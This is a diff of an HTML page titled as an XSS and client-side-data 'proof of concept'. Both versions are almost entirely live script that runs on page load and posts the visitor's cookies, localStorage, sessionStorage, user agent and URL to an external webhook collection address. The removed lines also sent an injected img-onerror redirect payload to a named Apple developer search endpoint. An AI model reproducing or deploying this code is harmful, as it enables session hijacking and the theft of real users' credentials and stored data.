@@ -2,36 +2,24 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Proof of Concept</title>
+  <title>XSS PoC</title>
 </head>
 <body>
-  <h2>Loading...</h2>
+  <h1>🔒 Proof of XSS & CSD Exploit</h1>
   <script>
-    // Webhook to receive victim data
-    const webhook = "https://webhook.site/6e22d112-4274-4426-a223-2ba3b29b2868";
-
-    // Step 1: Send fetch request to vulnerable Apple endpoint with injected payload
-    fetch("https://developer.apple.com/search/services/v1/quick-links/", {
+    // Send victim data to Webhook
+    fetch("https://webhook.site/6e22d112-4274-4426-a223-2ba3b29b2868", {
       method: "POST",
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded"
-      },
-      body: `<img src=x onerror="location='https://zaid111a.github.io/apple11/apple22.html'" />`
-    });
-
-    // Step 2: Immediately send victim info to your webhook
-    fetch(webhook, {
-      method: "POST",
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         cookie: document.cookie,
         localStorage: JSON.stringify(localStorage),
         sessionStorage: JSON.stringify(sessionStorage),
         userAgent: navigator.userAgent,
-        url: location.href
-      }),
-      headers: {
-        "Content-Type": "application/json"
-      }
+        origin: location.origin,
+        path: location.pathname,
+        fullURL: location.href
+      })
     });
   </script>
 </body>
